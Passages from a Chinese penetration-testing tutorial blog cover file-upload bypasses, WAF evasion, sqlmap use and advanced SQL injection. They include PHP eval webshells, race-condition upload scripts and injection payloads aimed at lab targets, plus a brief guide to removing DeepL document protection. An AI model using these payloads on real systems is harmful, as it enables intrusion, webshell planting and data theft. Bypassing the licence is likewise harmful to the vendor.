00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。 所以：0x00，%00，/00都是可以的！ %00截断的条件 php版本要小于5.3.4 修改php.ini的magic_quotes_gpc为OFF状态（magic_quotes_gpc他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理） 上传路径是可以控制的 则修改路径 上面的12.php后面多了%00，造成了右边的截断，空格后面的全部都不要了。 需要注意的是，可能会对%00进行编码。 如何利用 注意，这里面有一个重命名，是我们可以控制的，所以我们可以抓包，然后在POST请求中修改road参数即可！ 修改之后变成： 报错，因为要.jpg为后缀，所以在文件名后面加上.jpg即可（全部都要修改）： 逻辑安全 二次渲染 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。 形式：判断图片格式后用imagecreatefromjpeg()函数进行二次渲染 绕过方式： 抓包找到二次渲染中未被改动的地方，将一句话马插入该地方，.jpg|.png|.gif三种文件格式不同，所以构造马的方式也不同 注：gif文件最简单，直接用ue等16进制编辑器就可以改，但是jpg和png需要特殊的构造脚本 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。将保存下来经过服务器二次渲染的那张jpg图片，用010编辑器与我们的图片马进行比对，看哪一些字节是被更改过的，在没有被更改的地方替换成我们的马重新上传。 用此脚本进行处理生成payload.jpg。然后再上传payload.jpg 条件竞争（先上传再校验） 一些网站上传文件的逻辑是先允许上传任意文件，然后检测上传文件的文件包是否合法（校验文件后缀、内容等），如果不合法则删除文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 造成漏洞的原因：先保存文件，再判断是否是允许的文件，如果不允许，则删除。 漏洞利用思路：上传一个写入木马的php文件backdoor.php，抓取数据包，对此数据包进行多线程高并发的重放。与此同时，用python不断的请求文件backdoor.php，由于多线程高并发的重放上传backdoor.php文件，所以一定会存在上传成功但还未来得及删除的backdoor.php文件使得python请求成功，一旦请求成功则会在本地写入木马。用菜刀连接即可getshell。 注意：这种条件竞争，即使你执行了一次，在那段时期内，这个不会被删（正在请求），但是一旦请求完毕，二次渲染完成，则该文件照样被删除！所以，请注意你的脚本是要 执行创建木马文件 的功能的。 123#backdoor.php#用来写入木马文件shell.php&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_PO[&quot;cmd&quot;])?&gt;&#x27;);?&gt; 1234567891011#requests_2.py#用来请求backdoor.phpimport requestsurl = &quot;http://ip/upload-labs/upload/backdoor.php&quot;url_2 = &quot;http://ip/upload-labs/upload/shell.php&quot;while True: html = requests.get(url) html_2 = requests.get(url_2) if html_2.status_code == 200: #判断shell.php是否写入成功 print(&quot;OK&quot;) break 先上传文件backdoor.php，抓取数据包发送到Inturder模块 高并发上传脚本： 1234567891011121314151617181920#upload.pyimport requestsfrom threading import Threadfile = &#123; #文件信息和文件 &quot;upload_file&quot;:open(&#x27;C:\\\\users\\\\xiamo\\\\desktop\\\\backdoor.php&#x27;), &quot;Content-Type&quot;:&quot;application/octet-stream&quot;, &quot;Content-Disposition&quot;:&quot;form-data&quot;, &quot;filename&quot;:&quot;backdoor.php&quot;&#125;url = &quot;http://192.168.1.120/upload-labs/Pass-17/index.php&quot;data = &#123; #参数 &quot;submit&quot;:&quot;上传&quot;&#125;def upload(): res = requests.post(url, files=file, data=data) print(res.status_code)while True: t = Thread(target=upload()) #创建线程 t.start() #开启线程 另外，使用inturder功能的步骤如下： 清除$$： 设置null payload： 设置多线程： 然后在浏览器中不停地访问那个上传的文件即可。 user.ini与.htaccess绕过 user.ini 利用范围 以fastcgi运行的php 首先得知道php.ini然后再去了解：.user.ini。它比.htaccess用的更广。.user.ini文件上传绕过和.htaccess文件上传绕过方式相似，都是上传一个攻击者自定义的配置文件导致服务器对图片文件的错误处理而导致的文件执行，但是.user.ini使用更加广泛，只要是以fastcgi运行的php都可以用这个方法，但是它的局限性在于上传的.user.ini文件目录必须存在可执行的php文件。 参考：https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html 简析 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 配置变量中有auto_prepend_file和auto_apend_file指定在文件前和文件尾包含文件。（这两个才是我们可以上传马的关键，指）如: 12auto_apend_file=01.gif # 指定一个文件，自动包含在要执行的文件前。auto_prepend_file=01.gif # 指定一个文件，自动包含在要执行的文件后。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 利用 新建一个文件名为.user.ini的文件，并将内容写为： 1auto_prepend_file=test.txt 将.user.ini上传至服务器 新建一个文件名为test.txt的文件，并将内容写为如下，或者写webshell马： 1&lt;?php phpinfo();?&gt; 再访问上传目录下的???.php，即可将test.txt内的内容脚本正常执行。 .htaccess 见apache解析漏洞绕过 解析漏洞 IIS解析漏洞 目录解析漏洞（/test.asp/1.jpg） 在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了。 文件名解析漏洞(test.asp;.jpg) 在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。 畸形解析漏洞(test.jpg/*.php) 微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5 在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[x])?&gt;&#x27;)?&gt; 将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行（这个的执行过程看下面），所以图片里面的代码就会被执行。我们会神奇的发现在 /upload 目录下创建了一个一句话木马文件 shell.php。 临时解决办法：设置 cgi.fix_pathinfo为0 Ngnix解析漏洞 畸形解析漏洞(test.jpg/*.php) 原因：php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo（默认为1表示开启）。/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行 例子： test.jpg存在（已上传），a.php不存在 访问：test.jpg/a.php。因为a.php，所以交给PHP处理；PHP发现没有这个文件，那么删除后面的a.php访问test.jpg，然后发现这个不是php文件，执行不了，于是返回Access denied。 但是Ngnix+php就可以，而且与Nginx无关，但在高版本的php中，由于security.limit_extensions 的引入，使得该漏洞难以被成功利用。因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。 cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题） %00空字节代码解析漏洞 原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，此时，会把xxx.jpg文件当作php来执行。 Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37 CVE-2013-4547(%20%00) //跟畸形漏洞好像啊 影响nginx版本：nginx 0.8.41 ~ 1.5.6. 这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。 即：假设服务器上存在文件：file.jpg(空格) ，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.jpg \\0.php 让Nginx认为文件file.jpg(空格)的后缀为.php。 上传一个test.jpg(空格)，然后访问它，因为访问时URL编码会将空格变成%20，所以访问的实际内容是test.jpg%20，不存在，那么我们访问test.jpgAAAphp，通过BP抓包，然后将三个A的ASCII分别改成：20 00 2e(这个翻译过来就是 点)。即我们访问的是有空格的php文件。但是Access denied，因为PHP的设置让我们没办法执行这个PHP文件代码（因为它不是php后缀），security.limit_extensions的存在，导致我们并不能利用此漏洞（跟畸形漏洞一个解释）。 Apache解析漏洞 文件名解析漏洞 从右往左解析，遇到不能执行的就继续向左解析，直到可以运行解析到可识别后缀 罕见后缀 上面的黑名单很多都是罕见的 htaccess文件与httpd.conf文件 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。 httpd.conf 和 .htaccess 用于配置 Apache Web 服务器（稍后我们将讨论它们之间的相同点和不同点）。另一方面，php.ini 用于配置 PHP 运行时，允许您在其上执行动态 Web 应用程序的 PHP 代码。 httpd.conf 和 .htaccess 都是 Apache Web 服务器的基于文本的配置文件。 httpd.conf 中的配置适用于整个服务器，而 htaccess 中的配置仅适用于它所在的文件夹（及其所有子文件夹）。 httpd.conf 文件在服务器启动时读取。当您对其进行更改时，您需要重新启动 Apache。另一方面，.htaccess 文件在每次 HTTP 请求时都会被读取，因此对它们的更改不需要重新启动服务器。 生效的前提： 12mod_rewrite 模块开启AllowOverride All(默认为None) 常见： 把所有名字里面带有shell的文件当成php脚本来执行 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 让.jpg后缀名文件格式的文件名以php格式解析 1AddType application/x-httpd-php .jpg 问题： 如果配置错误会出现错误：Internal Server Error 图片木马出现：Parse error: syntax error, unexpected ')' in /var/www/html/upload/piccreate_muma.jpg on line 14 漏洞修复（中间件/CVE/其他漏洞） 编辑器漏洞 这个编辑器就是网页的那种编辑器，例如有的网站有编辑器，使用第三方，然后对音频、文字进行处理。大多数网页编辑器的漏洞都是上传漏洞！ 手册：https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 漏洞利用 需要知道两个点： 使用了什么编辑器（名字+版本） 知道编辑器的路径 然后： 在网上查exp，在本地执行，使用它的脚本攻击这个网站 那么，怎么知道使用了什么编辑器？ 网站扫描 在后台看插件 CMS上传 通达OA：当发现一个OA系统，搜索他有什么漏洞，然后根据exp运行就好。会有很多方案，例如先上传后通过文件包含来运行。 防御 不要暴露上传文件的位置 禁用上传文件的执行权限 黑白名单 对上传的文件重命名，不易被猜测 对文件内容进行二次渲染 对上传的内容进行读取检查","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"一些有用的破解—日常篇","slug":"一些有用的破解—日常篇","date":"2023-05-25T00:56:16.000Z","updated":"2023-05-25T01:02:10.131Z","comments":true,"path":"articles/2023/05/25/一些有用的破解—日常篇/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/","excerpt":"","text":"Deepl pro 破解翻译后的docx文档只读 问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。 解决方法：将文档另存为.xml文档，然后右键用记事本打开，CTRL+F查找：&lt;w:documentProtection,，找到之后，有两种方法： 删除这一段完整标签&gt;，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。 找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了 破解网页版5000字限制 看：https://github.com/blueagler/DeepL-Crack","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"}]},{"title":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","slug":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","date":"2023-05-24T06:46:22.000Z","updated":"2023-05-25T01:16:01.277Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-WAF绕过与SQLMAP工具的使用/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"WAF绕过 WAF识别与WAF策略 这里不详细说，简单提一下：项目：wafw00f To do its magic, WAFW00F does the following: Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批） If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。 WAF策略 WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。 SQL关键字（如 union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay 等） 特殊符号（’”,; ()） 运算符（±*/%|） 操作符（=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=） 注释符（–，/**/） 数据绕过 除了上图提到的简单的这里不解释了（大小写、双写嵌入等） 关键字绕过 大小写、双写嵌入 堆叠注入，绕过select等 注释符绕过： 常用：//，-- , /**/, #, --+, -- -, ;,%00,--a，绕过：Uni/**/on 等价函数绕过 12345678910111213141516171819202122232425and=&amp;&amp; or=|| xor=| not=!# 比较符号（&lt;&gt;）绕过# 使用greatest()、least()# 使用between and。注：between 1 and 1; 等价于 =1hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()# 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 绕过符号 逗号 使用from或者offset。 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 重点：对于limit可以使用offset来绕过： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 空格 用tab代替空格，或者用其他空格符%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 使用浮点数： 12select * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3 括号绕过： 这种过滤方法常常用于time based盲注,例如： 1?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 等于号 使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; between 1 and 1; 等价于 =1 引号 宽字节/二次编码注入 编码绕过（用于编译一个字符串，例如查询 id='users'，则可以编译成id=0x0x7573657273十六进制） 通用绕过（编码）非关键字字符串 如URLEncode编码，ASCII,HEX,unicode编码绕过：or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 HTTP参数污染 HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。 原理 在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All(list) ASP/IIS Request.QueryString(“par”) ALL(comma-delimited string) 绕过 waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容 我们的后端是apache，那么我们只要将参数放在后面即可 注入样例：bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3 WAF逻辑层绕过 逻辑问题 云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护 当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass 比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns 性能问题 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子： ?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 白名单 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 各种数据库的特殊绕过 参考：https://www.cnblogs.com/SnowSec/p/14288249.html SQLMAP 使用 检查注入点 GET：sqlmap -u http://192.168.208.1:49154/Less-5/?id=1 POST： sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; sqlmap -r post.txt （当前用户下的所有）数据库（–dbs） sqlmap -r post.txt --dbs -v 3 获取当前数据库名：--current-db 查询表（先通过-D指定数据库） 1sqlmap -r post.txt -v 3 -D security --tables 查询列名（先通过-D指定数据库 -T指定表名） 1sqlmap -r post.txt -v 3 -D security -T users --columns 脱库（先通过-D指定数据库 -T指定表名） -C指定列名 然后–dump 1sqlmap -r post.txt -v 3 -D security -T users -C username --dump 直接全部脱出来 1sqlmap -r post.txt -v 3 -D security -T users --dump 获取系统信息 数据库的用户与密码 12sqlmap -r post.txt -v 3 --userssqlmap -r post.txt -v 3 --passwords 获取当前用户名：--current-user ​ 然后去cmd5里查询类型为mysql5的哈希密文，破解即可 --is-dba：当前用户是否为管理权限 该命令用于查看当前账户是否为数据库管理员账户，如下所示 1234567┌──(j3fffff㉿j3fffff)-[~/tmpdir]└─$ sqlmap -r post.txt -v 3 --is-dba[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#[11:03:25] [DEBUG] performed 2 queries in 0.03 secondscurrent user is DBA: True 这个payload是可以学习的 --roles：列出数据库管理员角色 执行命令 运行自定义sql语句 运行--sql-shell 运行操作系统命令 --os-cmd，--os-shell：运行任意操作系统命令. 在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。 如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。 用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。 Sqlmap支持ASP、ASP.NET、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。 读取文件 该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot; 上传文件 --file-write --file-dest：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。 1sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot; WAF绕过 WAF检测Ugent名单，使用sqlmap时可以加上参数–random agent（随机出现字母头），也可以自己设置 1--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot; sqlmap的速度过快，所以会被拦截，则添加延时参数 --delay参数 使用代理池，随机出IP，绕过IP白名单。或者自己设置代理：--proxy=http://127.0.0.1:8080 利用–tamper参数中的编码脚本 自己编写中转脚本","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","slug":"SQL注入进阶-堆叠、二次、DNS注入、各位置注入等","date":"2023-05-24T06:22:40.000Z","updated":"2023-05-25T01:14:52.450Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-堆叠、二次、DNS注入、各位置注入等/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/","excerpt":"","text":"堆叠注入（可绕过select）用法参考advance 堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。 与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是有限的, 可以用来执行查询语句, 而堆叠注入可以执行的是任意的语句。 但是不同的数据库有不同的注入语句。 查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上 例子：修改数据：select * from user_test;update user_test set name='modify' where name='张三'; 注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入 宽字节注入 在mysql中，用于转义（即在字符串中的符号前加上\\）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性（会返回false）。 意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。 重点：%df%27 注意： 我们在之前介绍过“set names gbk”其实干了三件事，等同于：SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个character_set client=binary，那么就是不存在了。 字符集（宽） GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。 MySQL的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置） 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。 注入原理 GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’（单引号逃逸），有了单引号就好注入了。 也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。 1234$sql = &quot;select * from user where username=&#x27;$username&#x27;&quot;; payload:-1%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;table.name&#x27; # (后面的&#x27;&#x27;可以使用16进制编码，编码结束后在前面加上0x) 常见URL编码 URL编码 注释 %27 单引号 %20 空格 %23 #号 %5c /反斜杠 header改为gbk：header(&quot;Content-type:text/html;charset=gbk&quot;); 防御 使用mysql_set_charset(utf8)指定字符集 使用mysql_real_escape_string进行转义 这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法： 在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary. 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 二次编码注入 二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。 这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。 重点：%2527 URL编码 编码肯定是因为原始的格式并不适合传输才进行的，例如+，=，&amp;，;等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。 